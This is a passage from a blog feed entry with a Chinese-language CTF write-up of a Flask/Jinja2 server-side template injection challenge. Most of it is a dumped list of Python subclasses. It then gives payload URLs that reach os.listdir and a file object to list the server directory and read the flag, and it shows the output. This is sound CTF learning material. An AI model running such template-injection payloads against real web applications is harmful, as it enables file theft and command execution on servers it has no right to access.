class="hljs-string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure>
-
-<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
-<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found<br></code></pre></td></tr></table></figure>
-
-<p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>攻防世界</tag>
         <tag>SSTI</tag>
       </tags>
   </entry>
